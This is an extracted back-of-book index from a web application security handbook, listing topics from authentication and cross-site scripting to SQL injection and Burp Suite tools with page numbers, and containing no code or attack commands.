deliberate backdoor scripts, 
660‚Äì661
between web applications, 
660‚Äì663
browser extensions casino 
component, 134
CAPTCHA, 198‚Äì199
customized automation, 
610‚Äì611
client-side attacks, 13
cloud computing, 14, 663‚Äì665
cloned systems, 664
tokens, 665
cookie injection methods, 
536‚Äì537
credentials, 171
defense mechanisms handling, 
30‚Äì35
administrator alerting, 33‚Äì34
audit log maintenance, 31‚Äì32
errors, 30‚Äì31
reacting to, 34‚Äì35
disabled elements, 132‚Äì133
encoding and, 66‚Äì67
forgotten password, 14
format string vulnerabilities, 
644
HTTP header injection, 
534‚Äì535
intentions, 13
login function, 164‚Äì165
MS-SQL databases, 326‚Äì327
multilayered privilege model, 
283
multistage login function, 188
MySQL, 328
network hosts, 561‚Äì562
non-HTTP services, 562‚Äì563
NULL bytes, 23‚Äì24
opaque data, 124
Oracle databases, 327
other users, 431‚Äì432
path traversal vulnerabilities
circumventing obstacles, 
374‚Äì377
successful, 374
target locations, 370‚Äì371
remote, 427
session management, 20
session token scripts, 217
shared hosting, 658‚Äì665
access, 658‚Äì660
deliberate backdoor scripts, 
660‚Äì661
between web applications, 
660‚Äì663
stored XSS steps, 438‚Äì439
tiered architectures, 648‚Äì654
categories, 648‚Äì649
tokens
encrypting, 232‚Äì233
bindex.indd 855 bindex.indd 855 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 856
856 Index n B‚ÄìB
meaningful, 212
URL translation, 396‚Äì397
username, 168
web application security, 6
web browsers, 559‚Äì568
websites created by, 448‚Äì449
XMLHttpRequest, 529
XSS, 251
attribute delimiters, HTML 
bypassing fi lters, 461‚Äì462
attribute names, HTML 
bypassing fi lters, 461
attribute values, HTML 
bypassing fi lters, 462
audit logs
defense mechanisms handling 
attackers, maintaining, 
31‚Äì32
key events, 32
poorly protected, 32
value, 31
audit trail, 429
authentication. See also
access controls; session 
management
anomalies, 201
application logic fl aws, 415‚Äì416
broken, 7
brute-force login function, 
162‚Äì165
CAPTCHA, 198‚Äì199
credentials
incomplete validation, 
180‚Äì181
insecure distribution, 184
insecure storage, 190‚Äì191
secret handling of, 192‚Äì193
strength, 192
transmission vulnerability, 
169‚Äì171
validation, 193‚Äì195
CSRF, 507‚Äì508
as defense, 159
defense mechanisms handling 
access with, 18‚Äì19
design fl aws, 161‚Äì184
drop-down menus, 193
eavesdroppers, 169
hacker‚Äôs methodology
application logic fl aws, 
811‚Äì813
credentials, autogenerated, 
809‚Äì810
credentials, unsafe 
distribution, 810‚Äì811
credentials, unsafe 
transmission, 810
impersonation, 808‚Äì809
insecure web storage, 811
password guessing, 807
password quality, 806
password recovery, 807‚Äì808
‚Äúremember me‚Äù functions, 
808
understanding, 805
username enumeration, 
806‚Äì807
username uniqueness, 809
vulnerability exploitation for 
unauthorized access, 
813
HTML forms, 160‚Äì161
HTTP, 50‚Äì51
sessions avoided with, 
208‚Äì209
impersonation, 178‚Äì180
hacker‚Äôs methodology, 
808‚Äì809
implementation fl aws in, 
185‚Äì191
information leakage 
prevention, 195‚Äì196
logging, 201
login function
account suspension, 197‚Äì198
fail-open, 185‚Äì186, 194
multistage, 186‚Äì190, 194‚Äì195
verbose failure messages, 
166‚Äì169
monitoring, 201
notifying, 201
passwords
change functionality, 171‚Äì
172, 193
change functionality misuse, 
199
forgotten functionality, 
173‚Äì175
predictable initial, 183
weak, 161‚Äì162
problems with, 19
‚Äúremember me‚Äù functions, 
175‚Äì176, 193
hacker‚Äôs methodology, 808
security, 191‚Äì201
brute-force attack prevention, 
196‚Äì199
subtleties, 195
smartcards, 206
standalone vulnerability 
scanners, 778‚Äì779
technologies, 160‚Äì161
tokens, 160
usernames
enumeration, 166‚Äì169, 
806‚Äì807
nonunique, 181‚Äì182
predictable, 182‚Äì183, 197
uniqueness, 809
XSS, 473‚Äì474
autocomplete
local privacy attacks, 552
XSS attack payloads, 446
automation. See customized 
automation
B
backdoor password, 178‚Äì179
source code, 708
backdoor scripts, deliberate, 
660‚Äì661
back-end components. See also
fi le inclusion; operating 
system commands; path 
traversal vulnerabilities
access controls, 357
data transmission, 357
e-mail header injection, 
398‚Äì399
HPI, 390
causes, 393‚Äì394
HPP, 394‚Äì395
server-side HTTP redirection, 
390‚Äì392
exploiting, 391‚Äì392
SMTP injection, 397‚Äì402
fl aws, 400‚Äì401
preventing, 402
SOAP injection, 386‚Äì388
banking application, 387‚Äì388
error messages, 388
fi nding and exploiting, 389
preventing, 27, 390
URL translation attacks, 
396‚Äì397
back-end request injection, 841
backslash character, escaping 
with, 419
backtick character, encapsulating 
function of, 363
banking application
multistage function, 263
per-page tokens, 252‚Äì253
SOAP injection, 387‚Äì388
banner grabbing, 101
Base64 encoding, 69
ASP.NET ViewState, 125‚Äì126
basic authentication, 50‚Äì51
batch queries, MS-SQL 
databases, 317
beating business limit, 
application logic fl aws, 
416‚Äì417, 429
bindex.indd 856 bindex.indd 856 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 857
 Index n C‚ÄìC 857
BeEF, 565‚Äì566
bit fl ipper, Burp Intruder, 593
encrypting tokens, 228‚Äì231
black-box code review, 702‚Äì703
blacklist-based fi lters, 23‚Äì24
XSS, 451‚Äì452
blind SQL injection, 626
blocked characters, fi lters, 
311‚Äì312
blog applications, input, 22
Boolean conditions, UNION
operator, 329
Boolean fl ag, 107
boundary validation, input, 
25‚Äì28, 313
breaking bank, application logic 
fl aws, 414‚Äì416
browser extensions. See also
Flash; Java; Silverlight
casino component, 133‚Äì134
attackers, 134
Chrome, 750
client-side control of user input 
with, 133‚Äì153
data transmission interception, 
135‚Äì139
obstacles, 138‚Äì139
serialized data, 136‚Äì138
debugger attached to, 151‚Äì152
decompiling, 139‚Äì150
bytecode, 139‚Äì141
bytecode obfuscation, 
144‚Äì146
Java applets example, 146‚Äì150
JavaScript manipulating 
original bytecode, 144
source code, 142‚Äì144
Firefox, 750
hacker‚Äôs methodology, 802‚Äì804
ActiveX controls, 804
debugger, 803‚Äì804
decompiling, 802‚Äì803
native client components, 153
same-origin policy, 525‚Äì527
Flash, 525‚Äì526
Java, 527
Silverlight, 526‚Äì527
targeting approaches, 135
technologies, 65
browsers. See web browsers
browsing history
JavaScript stealing, 560
local privacy attacks, 552
brute-force techniques
application mapping naming 
schemes exercise, 88
authentication security 
preventing, 196‚Äì199
hidden content, 81‚Äì85
login function, 162‚Äì165
passwords in wiki, 424
buffer overfl ow
detecting, 639‚Äì640
hacker‚Äôs methodology, 837‚Äì838
heap overfl ows, 635‚Äì636
off-by-one vulnerabilities, 
636‚Äì638
software, 687
source code, 709
stack overfl ows, 634‚Äì635
uncontrolled, 639
URL length, 639
bulk discount cheating, 
application logic fl aws, 418, 
429
Burp Intruder, 82‚Äì84, 86
bit fl ipper, 593
encrypting tokens, 228‚Äì231
‚Äúcharacter frobber,‚Äù 593
customized automation, 
590‚Äì602
data harvesting, 598‚Äì600
enumerating identifi ers, 
594‚Äì597
fuzzing, 600‚Äì602
payloads
choosing, 592‚Äì594
positioning, 591‚Äì592
predictable tokens, 213‚Äì214
response analysis, 594
sniper attack, 592
Unicode encoding, 375
user agent strings, 100
Burp Proxy, 754‚Äì755
Burp Repeater, 473, 681, 766
Burp Scanner, 764‚Äì765
Burp Sequencer, 767
auto analyze setting, 223
token randomness testing, 
219‚Äì221
Burp Spider, 74‚Äì76, 80
Burp Suite
AMF, 137
application mapping, 268
ASP.NET ViewState, 126
CA certifi cate, 758‚Äì759
‚Äúchange request method‚Äù 
command, 474‚Äì475
Comparer, 167
Content Discovery, 88‚Äì89
DSer, 136‚Äì137
‚Äúrequest in browser,‚Äù 272‚Äì273
session-handling mechanisms, 
603‚Äì609
cookie jar, 603‚Äì604
request macros, 604‚Äì606
session-handling rules, 
606‚Äì609
session-handling tracer, 609
business limit, application logic 
fl aws, 416‚Äì417, 429
business logic exploitation, 259
bytecode
decompiling browser 
extensions, 139‚Äì141
JavaScript manipulation, 144
obfuscation, 144‚Äì146
downloading, 140
Flash, 141
Java, 141
Silverlight, 141
source code recompiling
within browser, 142‚Äì143
outside browser, 143
URL, 140
C
CA certifi cate, Burp Suite, 
758‚Äì759
callbacks, function, 520
canonicalization
input, 28‚Äì29
web server software, 689‚Äì694
CAPTCHA
attackers, 198‚Äì199
customized automation, 
610‚Äì611
authentication, 198‚Äì199
bugs, 610‚Äì611
customized automation, 
610‚Äì612
attackers, 610‚Äì611
automatically solving, 
611‚Äì612
humans solving, 612
drones, 612
Cascading Style Sheets (CSS)
dynamically evaluated styles, 
459
font-family property, 
518‚Äì519
injection, cross-domain data 
capture, 517‚Äì519
web functionality, 60‚Äì61
casino component, browser 
extensions, 133‚Äì134
attackers, 134
CBC. See cipher block chaining
CGI query, 735‚Äì736
chaining
CBC
encrypting tokens, 227‚Äì233
PKC # 5 padding, 227‚Äì233
bindex.indd 857 bindex.indd 857 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 858
858 Index n C‚ÄìC
XSS, 450‚Äì451
‚Äúchange request method‚Äù 
command, 474‚Äì475
‚Äúcharacter frobber,‚Äù Burp 
Intruder, 593
checked exceptions, 30
checkout, application logic fl aws, 
410‚Äì411
CheckQuantity applet, 141
Chrome, 750
chrooted fi le system
path traversal vulnerabilities, 
380‚Äì381
UNIX, 381
cipher block chaining (CBC)
encrypting tokens, 227‚Äì233
PKC # 5 padding, 686‚Äì687
ciphertext, 224‚Äì226
.class fi les, 141
ClearedFunds element, 
387‚Äì388
cleartext, passwords, 190‚Äì191
clickjacking, 511. See also user 
interface redress attacks
client components, native, 153
client-side
attacks, 13
data transmission, 118‚Äì127
ASP.NET ViewState,
124‚Äì127
for developers, 118
hacker‚Äôs methodology, 801
hidden HTML forms, 118‚Äì120
HTTP cookies, 121
opaque data, 123‚Äì124
Referrer header, 122
security, 154‚Äì156
URL parameters, 121‚Äì122
hacker‚Äôs methodology, data 
transmission, 801
HPP, 548‚Äì550
information disclosure leaks, 
629
injection, 531‚Äì550
SQL, 547‚Äì548
JavaScript, validation with, 
130‚Äì131, 156
security, 431‚Äì432
session token hijacking, 
243‚Äì244
SQL injection, 547‚Äì548
SSL certifi cation, 138
user input controlled by, 117
browser extensions, 133‚Äì153
hacker‚Äôs methodology, 
801‚Äì802
HTML forms, 127‚Äì133
validation myths, 155‚Äì156
web functionality, 57‚Äì65
Ajax, 62‚Äì63, 384
browser extension 
technologies, 65
CSS, 60‚Äì61
DOM, 62
forms, 58‚Äì60
HTML, 58
HTML5, 64‚Äì65
hyperlinks, 58
JavaScript, 61
JSON, 63
same-origin policy, 64
VBScript, 61
XSS attack payloads escalating, 
447
cloned systems, 664
cloud computing
attackers, 14, 663‚Äì665
cloned systems, 664
tokens, 665
defense mechanism, 664
feature-fi rst approach, 664‚Äì665
loss of control in, 663‚Äì664
management tool migration 
to, 664
web applications, 5
web storage, 665
CMS. See content management 
system
code browsing tools, 743
code injection, 288
code review. See source code, 
review
commands. See operating system 
commands
comments
MySQL, 303‚Äì304, 312
source code, 710‚Äì711
SQL, 312
Comparer, Burp Suite, 167
compiled applications. See native 
client components
concealed sequences, 213‚Äì215
concurrent logins, 250
conditional errors, SQL injection, 
320‚Äì322
conjunctive queries fi lters, 350
LDAP injection, 352‚Äì353
CONNECT method, 682, 755
content
enumerating and functionality, 
74‚Äì97
hidden
brute-force techniques 
discovering, 81‚Äì85
discovering, 80‚Äì93
hacker‚Äôs methodology, 
application mapping, 
796‚Äì797
inference from published 
content discovering, 
85‚Äì89
Nikto discovering, 93
public information 
discovering, 89‚Äì91
user-directed spidering 
discovering, 81‚Äì83
web server leveraged for 
discovering, 91‚Äì93
Wikto discovering, 92‚Äì93
web server and default, 92, 
671‚Äì677
debug functionality, 671‚Äì672
hacker‚Äôs methodology, 847
JMX, 674‚Äì676
powerful functions, 673‚Äì674
sample functionality, 672‚Äì673
Content Discovery, Burp Suite, 
88‚Äì89
content management system 
(CMS), 77
web servers, 92
Content-Length header, 42
POST request, 581
Content-Type header, 136, 138, 
476, 478, 525‚Äì526
context-dependent, access 
controls, 258
Cookie header, 41, 47
cookie injection
attacker methods, 536‚Äì537
session fi xation, 537‚Äì540
cookie jar, Burp Suite, 603‚Äì604
cookies
arbitrary, 537
attributes, 47
domain restrictions, 245‚Äì247
hacker‚Äôs methodology, 820‚Äì821
HTTP, 19, 47
client-side data transmission, 
121
session management tokens, 
207‚Äì208, 234‚Äì236
HTTP header injection, 533
login function, 163
path restrictions, 247‚Äì248
persistent, 550
refl ected XSS, 437‚Äì438
RemembeMe, 407‚Äì408
‚Äúremember me‚Äù functions, 
175‚Äì176
ScreenName, 407‚Äì408
bindex.indd 858 bindex.indd 858 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 859
 Index n C‚ÄìC 859
session management, liberal 
scope, 244‚Äì248
XSS exploiting via, 475
COPY method, 679
count() function, 348
credentials
attackers, 171
authentication vulnerability, 
169‚Äì171
e-mail containing, 184
hacker‚Äôs methodology, 
authentication
autogenerated, 809‚Äì810
unsafe distribution, 810‚Äì811
unsafe transmission, 810
incomplete validation, 180‚Äì181
insecure distribution, 184
insecure storage, 190‚Äì191
secret handling of, 192‚Äì193
strength, 192
validation, 193‚Äì195
web server and default, 
670‚Äì671
hacker‚Äôs methodology, 846
cross-domain data capture, 
515‚Äì516
CSS injection, 517‚Äì519
Firefox, 521
HTML injection, 516‚Äì517
JavaScript hijacking, 519‚Äì520
E4X, 523‚Äì524
function callbacks, 520
JSON, 521
preventing, 524
variable assignment, 522
proxy services, 529‚Äì531
cross-domain requests
JSON, 477
XMLHttpRequest, 528‚Äì529
XSS sending XML, 477‚Äì478
/crossdomain.xml, 525‚Äì526
cross-site request forgery (CSRF), 
8, 244, 504‚Äì511
anti-CSRF tokens, 508‚Äì509, 
516‚Äì517
XSS defeating, 510‚Äì511
authentication, 507‚Äì508
fl aws
exploiting, 506‚Äì507
preventing, 508‚Äì510
real-world, 505
hacker‚Äôs methodology, 820
session management, 251
cross-site scripting (XSS), 8
attack payloads, 443‚Äì447
autocomplete, 446
escalating client-side, 447
escalation to other pages, 
473‚Äì474
inducing actions, 445‚Äì446
Trojan injection, 444‚Äì445
trust relationship 
exploitation, 446‚Äì447
virtual defacement, 443‚Äì444
attackers, 251
authentication, 473‚Äì474
chaining, 450‚Äì451
CSRF defeating anti-CSRF 
tokens with, 510‚Äì511
database error messages, 620
defense, 28
delivery mechanisms, 447‚Äì451
in-band, 449‚Äì450
out-of-band, 450
DOM-based, 440‚Äì442
delivering, 448‚Äì449
fi nding and exploiting, 
487‚Äì491
input validation, 497
output validation, 497‚Äì498
preventing, 496‚Äì498
refl ected XSS converted into, 
472‚Äì473
steps, 441
escaping, 420
exploits
cookies, 475
delivering, 473‚Äì481
JavaScript executed within 
XML responses, 
478‚Äì479
nonstandard request and 
response content, 
476‚Äì479
Referrer header, 475‚Äì476
XML requests sent crossdomain, 477‚Äì478
fi lters
anti-, 452, 748
blacklist-based, 451‚Äì452
IE, 479‚Äì481
web browsers, 479‚Äì481
HTML tag pairs, 422
IE fi lter, 479‚Äì481
JavaScript, 436‚Äì438
non-HTTP services, 562‚Äì563
NULL bytes, 460
POST request changed to GET
request, 474‚Äì475
prevalence, 432
preventing, 492‚Äì498
real-world, 442‚Äì443
refl ected, 434‚Äì438
Apache, 442
cookies, 437‚Äì438
defensive fi lters, 455‚Äì456
delivering, 448‚Äì449
DOM XSS converted from, 
472‚Äì473
exploiting, 435‚Äì438, 474
fi nding and exploiting, 
452‚Äì481
hacker‚Äôs methodology, 
829‚Äì830
HTML limitations, 495‚Äì496
IE, 435
input insertion, 495
input validation, 492‚Äì493
length limits, 471‚Äì473
output validation, 493‚Äì495
preventing, 492‚Äì496
‚Äúremember me‚Äù function, 437
sanitizing fi lters, 468‚Äì471
signature-based fi lters, 
455‚Äì456
steps, 436‚Äì437
stored XSS compared to, 
439‚Äì440
user input testing, 453
user input testing to 
introduce script, 
454‚Äì455
security evolution, 433
session token vulnerabilities, 
243‚Äì244
source code, 704‚Äì705
stored, 438‚Äì440
attacker steps, 438‚Äì439
delivering, 449‚Äì450
e-mail testing, 483‚Äì484
fi nding and exploiting, 
481‚Äì487
HTML limitations, 495‚Äì496
input insertion, 495
input validation, 492‚Äì493
MySpace, 442‚Äì443, 446
output validation, 493‚Äì495
preventing, 492‚Äì496
refl ected XSS compared to, 
439‚Äì440
search function, 439
uploaded fi les testing, 
484‚Äì487
vulnerabilities
identifying, 451‚Äì452
low-risk, 451
varieties, 433‚Äì442
XSS Shell, 566
cryptographic algorithms, 687
CSRF. See cross-site request 
forgery
bindex.indd 859 bindex.indd 859 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 860
860 Index n D‚ÄìD
CSS. See Cascading Style Sheets
Curl, 788
custom development, web 
applications, 10
custom encoding, path traversal 
vulnerabilities, 377‚Äì378
customized automation
barriers to, 602‚Äì612
Burp Intruder, 590‚Äì602
data harvesting attack, 
598‚Äì600
enumerating identifi ers 
attack, 594‚Äì597
fuzzing attack, 600‚Äì602
CAPTCHA puzzles, 610‚Äì612
attackers, 610‚Äì611
automatically solving, 
611‚Äì612
humans solving, 612
data harvesting, 572
basic approach, 584‚Äì586
Burp Intruder, 598‚Äì600
causes, 583‚Äì584
JAttack, 585‚Äì586
uses, 584
effi ciency, 571
enumerating identifi ers, 
572‚Äì583
basic approach, 574
Burp Intruder, 594‚Äì597
detecting hits, 574‚Äì576
examples, 573
HTTP status code, 574
JAttack, 577‚Äì583
Location header, 575
response body, 575
response length, 574‚Äì575
scripting, 576‚Äì577
Set-Cookie header, 575
time delays, 575‚Äì576
fuzzing, 572‚Äì573
Burp Intruder, 600‚Äì602
JAttack, 588‚Äì590
objective, 586‚Äì587
strings, 587
session-handling mechanisms, 
602‚Äì609
standalone vulnerability 
scanners, 780‚Äì781
uses, 572‚Äì573
Cygwin environment, 577
D
DAC. See discretionary access 
control
data capture. See cross-domain 
data capture
data harvesting, 572
basic approach, 584‚Äì586
Burp Intruder, 598‚Äì600
causes, 583‚Äì584
JAttack, 585‚Äì586
uses, 584
data stores. See also Extensible 
Markup Language; 
Lightweight Directory 
Access Protocol; Structured 
Query Language
accessing, 288‚Äì289
NoSQL, 342‚Äì343
privilege level, 287
web applications relying on, 
287
data transmission. See also user 
input
back-end components, 357
browser extensions 
intercepting, 135‚Äì139
obstacles, 138‚Äì139
serialized data, 136‚Äì138
client-side, 118‚Äì127
ASP.NET ViewState,
124‚Äì127
for developers, 118
hacker‚Äôs methodology, 801
hidden HTML forms, 118‚Äì120
HTTP cookies, 121
opaque data, 123‚Äì124
Referrer header, 122
security, 154‚Äì156
URL parameters, 121‚Äì122
lazy load approach, 626
opaque, 123‚Äì124
attackers, 124
database administrator (DBA), 
325‚Äì326
The Database Hacker‚Äôs Handbook,
326
databases
access
ASP.NET API methods, 721
Java API methods, 714‚Äì715
Perl language API methods, 
737‚Äì738
code components
dangerous, 742
SQL injection, 741‚Äì742
error messages, 619‚Äì622
encryption oracle, 620‚Äì622
information disclosure, 
619‚Äì620
XSS in, 620
escalation attacks, 
319, 325‚Äì328
fi ngerprinting, 303‚Äì304
information_schema,
309‚Äì310
MS-SQL
attackers, 326‚Äì327
automated exploitation, 330
batch queries, 317
default lockdown, 326‚Äì327
error messages, 334‚Äì338
out-of-band channels, 317
syntax, 332‚Äì334
WAITFOR command, 322‚Äì323
Oracle
attackers, 327
11g, 318
error messages, 334‚Äì338
out-of-band channels, 
317‚Äì318
syntax, 332‚Äì334
time delays, 323‚Äì324
UNION operator, 307‚Äì308
searchable and sortable, 
321‚Äì322
stored procedures, 339
Davtest, 680
DBA. See database administrator
debuggers
browser extensions attaching, 
151‚Äì152
error messages, 425‚Äì426, 
618‚Äì619
common, 619
hacker‚Äôs methodology, 
application mapping, 798
hacker‚Äôs methodology, browser 
extensions, 803‚Äì804
Java, 151‚Äì152
messages
application logic fl aws, 
424‚Äì426
verbose, 425
Silverlight, 152
web server, 671‚Äì672
declarative access controls, 
282‚Äì283
decompiling
browser extensions, 139‚Äì150
bytecode, 139‚Äì141
bytecode obfuscation, 
144‚Äì146
Java applets example, 146‚Äì150
JavaScript manipulating 
original bytecode, 144
source code, 142‚Äì144
hacker‚Äôs methodology, browser 
extensions, 802‚Äì803
Jad, Java, 148‚Äì150
decryption algorithms, 650
default content
bindex.indd 860 bindex.indd 860 8/19/2011 12:01:35 PM 8/19/2011 12:01:35 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 861
 Index n E‚ÄìE 861
hacker‚Äôs methodology, 
application mapping, 797
web server, 671‚Äì677
hacker‚Äôs methodology, 847
default credentials, web server, 
670‚Äì671
hacker‚Äôs methodology, 846
default lockdown, MS-SQL 
databases, 326‚Äì327
defense in depth
SQL injection, 342
tiered architectures, 656
web server software, 696‚Äì697
defense mechanisms. See also
security
access
authentication, 18‚Äì19
control, 20‚Äì21
session management, 19‚Äì20
attackers, 30‚Äì35
administrator alerting, 33‚Äì34
audit log maintenance, 31‚Äì32
errors, 30‚Äì31
reacting to, 34‚Äì35
elements, 17‚Äì18
input, 21‚Äì29
approaches to, 23‚Äì25
user access, 18‚Äì21
defensive fi lters, refl ected XSS, 
455‚Äì456
DELETE method, 679
DELETE statements, 297‚Äì298
deliberate backdoor scripts, 
660‚Äì661
developers
application logic fl aws, 429‚Äì430
client-side data transmission, 
118
HTML encoding mistakes, 
494‚Äì495
web applications security, 3
digest authentication, 50‚Äì51
directory listings, web servers, 
677‚Äì679
Allaire JRun, 690‚Äì691
directory names, 105
disabled elements
attackers, 132‚Äì133
HTML forms, 131‚Äì133
discount cheating, application 
logic fl aws, 418, 429
discretionary access control 
(DAC), 282
disjunctive queries fi lters, 350
LDAP injection, 351
.dll fi les, 141
DNS rebinding, 563‚Äì564
DOCTYPE element, 384‚Äì385
document object model (DOM), 
61
hacker‚Äôs methodology, 849‚Äì850
JavaScript, 440
JavaScript API methods, 740
web functionality, 62
XSS, 440‚Äì442
delivering, 448‚Äì449
fi nding and exploiting, 
487‚Äì491
input validation, 497
output validation, 497‚Äì498
preventing, 496‚Äì498
refl ected XSS converted to, 
472‚Äì473
steps, 441
DocumentRoot directive, 683
DOM. See document object 
model
domain restriction cookies, 
245‚Äì247
DOMTracer, 488
dot character, script code 
bypassing fi lters alternatives 
to, 466
‚Äúdot-dot-slash‚Äù sequence, 
369. See also path traversal 
vulnerabilities
Dowd, Mark, 634
downloading
bytecode, 140
encrypting tokens, 231‚Äì232
drop-down menus, 
authentication, 193
DSer, Burp Suite, 136‚Äì137
Dump Servlet, Jetty, 672
dynamic code execution
ASP.NET API methods, 722
Java API methods, 715
OS command injection, 362
vulnerabilities, 366‚Äì367
Perl language API methods, 
738
PHP API methods, 730‚Äì731
dynamically constructed strings, 
466
E
E4X. See ECMAScript for XML
Eagle, Chris, 634
eavesdroppers
authentication, 169
session tokens, 234
eBay, 505
ECB ciphers. See electronic 
cookbook ciphers
Echo Mirage, 139
ECMAScript for XML (E4X), 463
JavaScript hijacking, 523‚Äì524
edit parameter, 107
Edwards, Dean, 471
EJB. See Enterprise Java Bean
electronic cookbook ciphers 
(ECB ciphers), 224‚Äì226
e-mail
account activation URLs, 184
credentials sent in, 184
forged, 448
header injection, 398‚Äì399
stored XSS testing, 483‚Äì484
as username, 167, 196
encoding
Apache chunked overfl ow, 688
attackers and, 66‚Äì67
Base64, 69
ASP.NET ViewState,
125‚Äì126
custom, path traversal 
vulnerabilities, 377‚Äì378
hex, 69‚Äì70
HTML, 68‚Äì69
developer mistakes, 494‚Äì495
script code bypassing fi lters, 
468
Unicode, 67‚Äì68
Burp Intruder, 375
URL, 67
SQL injection, 300‚Äì301
truncating, 378
web server software, 689‚Äì694
encrypting
.NET, 686
‚Äúremember me‚Äù function, 177
tokens, 223‚Äì233
attackers, 232‚Äì233
Burp Intruder bit fl ipper, 
228‚Äì231
CBC, 227‚Äì233
downloading, 231‚Äì232
ECB ciphers, 224‚Äì226
‚Äúreveal‚Äù encryption oracle, 
232
encryption oracle
application logic fl aws, 407‚Äì408
‚Äúremember me‚Äù function, 407
database error messages, 
620‚Äì622
‚Äúreveal,‚Äù encrypting tokens, 
232
Enterprise Java Bean (EJB), 53
enterprise resource planning 
software (ERP), 4
enumerating identifi ers, 572‚Äì583
basic approach, 574
Burp Intruder, 594‚Äì597
bindex.indd 861 bindex.indd 861 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 862
862 Index n F‚ÄìF
detecting hits, 574‚Äì576
examples, 573
hacker‚Äôs methodology, 
application mapping, 
797‚Äì798
HTTP status code, 574
JAttack, 577‚Äì583
Location header, 575
response body, 575
response length, 574‚Äì575
scripting, 576‚Äì577
Set-Cookie header, 575
time delays, 575‚Äì576
ERP. See enterprise resource 
planning software
error messages
Apache, 628
ASP.NET, 628
database, 619‚Äì622
encryption oracle, 620‚Äì622
information disclosure, 
619‚Äì620
databases, XSS in, 620
debugger, 425‚Äì426, 618‚Äì619
common, 619
dynamically generated, 434
engineering informative, 
624‚Äì625
exploiting, 615‚Äì625
generic, 628
IE, 622
information disclosure, 
615‚Äì625
generic, 628
Java, 628
keywords, 622
Microsoft IIS, 628
MS-SQL databases, 334‚Äì338
MySQL, 334‚Äì338
ODBC, 624
Oracle databases, 334‚Äì338
public information, 623
published content, 625
script, 616‚Äì617
search engines, 623
server, 619‚Äì622
SOAP injection, 388
source code, 623
SQL injection, 334‚Äì338
stack traces, 617‚Äì618
UNION operator, 306
VBScript, 616
verbose, 30‚Äì31, 624
errors
conditional, SQL injection, 
320‚Äì322
defense mechanisms handling 
attackers and, 30‚Äì31
unhandled, 30‚Äì31
escaping
application logic fl aws, 419‚Äì420
with backslash character, 419
JavaScript, script code 
bypassing fi lters, 465‚Äì466
XSS, 420
Etag string, 128‚Äì129
eval function, 362, 722
script code bypassing fi lters 
alternatives to, 466
event handlers
HTML5, 458
script code in HTML with, 
457‚Äì458
Expires header, 42
Extensible Markup Language 
(XML), 56. See also Simple 
Object Access Protocol; XML 
Path Language
E4X, 463
injection, 383‚Äì390
XXE, 384‚Äì386, 841
interpreting, 387
XSS exploits
JavaScript in, 478‚Äì479
sending cross-domain, 
477‚Äì478
Extract Grep function, 598
F
fail-open login function, 185‚Äì186, 
194
failure messages, verbose, 
166‚Äì169
fi le extensions, 102‚Äì105
fi le inclusion
hacker‚Äôs methodology, 835‚Äì836
local, 382
remote, 381‚Äì382
fl aw testing, 383
static resources, 382
vulnerabilities, 381‚Äì383
fi nding, 382‚Äì383
PHP, 381‚Äì382
fi le path manipulation, 368‚Äì383. 
See also path traversal 
vulnerabilities
fi lters
blocked characters, 311‚Äì312
conjunctive queries, 350
LDAP injection, 352‚Äì353
disjunctive queries, 350
LDAP injection, 351
exploiting defective, 313
HTML bypassing, 459‚Äì465
attribute delimiters, 461‚Äì462
attribute names, 461
attribute values, 462
character sets, 464‚Äì465
tag brackets, 462‚Äì464
tag name, 460‚Äì461
input, path traversal 
vulnerabilities, 374‚Äì377
LDAP, 350
Oracle PL/SQL Exclusion List 
bypassing, 692‚Äì694
refl ected XSS
defensive, 455‚Äì456
sanitizing, 468‚Äì471
signature-based, 456‚Äì457
sanitizing, refl ected XSS, 
468‚Äì471
script code bypassing, 465‚Äì468
dot character alternatives, 
466
dynamically constructed 
strings, 466
encoding, 468
eval function alternatives, 
466
JavaScript escaping, 465‚Äì466
multiple technique 
combination, 466‚Äì467
VBScript, 467
VBScript and JavaScript, 
467‚Äì468
simple match conditions, 350
SQL injection bypassing, 
311‚Äì313
XSS
anti-, 452, 748
blacklist-based, 451‚Äì452
IE, 479‚Äì481
web browsers, 479‚Äì481
fi nancial services
application logic fl aws, 412‚Äì416
ASPs, 658
fi ngerprinting databases, SQL 
injection, 303‚Äì304
Firebug, 785
Firefox, 459
browser extensions, 750
cross-domain data capture, 521
Firesheep tool, 234
hacker‚Äôs toolkit, 749‚Äì750
Referrer header, 239
Firesheep tool, Firefox, 234
fi rewalls, 12
alerts, 33
WAFs, NULL bytes, 460
fi rst-order XSS. See refl ected XSS
500 Internal Server 
Error, 49
brute-force techniques, 85
bindex.indd 862 bindex.indd 862 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 863
 Index n G‚ÄìH 863
503 Service Unavailable,
49
Flash, 134‚Äì135
bytecode, 141
/crossdomain.xml, 525‚Äì526
LSOs, 553
same-origin policy, 525‚Äì526
serialized data, 137‚Äì138
font-family property, 518‚Äì519
forced browsing, application 
logic fl aws, 411
forgotten password, 584
attackers using, 14
format string vulnerabilities
attackers, 644
causes, 643
detecting, 644
hacker‚Äôs methodology, 838
source code, 710
forms
HTML, 58‚Äì59
authentication, 160‚Äì161
client-side control of user 
input with, 127‚Äì133
client-side data transmission 
with hidden, 118‚Äì120
disabled elements, 131‚Äì133
intercepting proxy 
modifying hidden, 
119‚Äì120
length limits, 128‚Äì129
script-based validation, 
129‚Äì131
web functionality, 58‚Äì60
400 Bad Request, 48
brute-force techniques, 84
401 Unauthorized, 48
brute-force techniques, 84‚Äì85
403 Forbidden, 49
brute-force techniques, 84‚Äì85
404 Not Found, 49
405 Method Not Allowed, 49
413 Request Entity Too 
Large, 49
414 Request URI Too Long,
49
framebusting, UI redress 
attacks, 514‚Äì515
function callbacks, JavaScript 
hijacking, 520
functional paths, web 
application pages versus,
93‚Äì96
functionality. See web 
functionality
function-specifi c input 
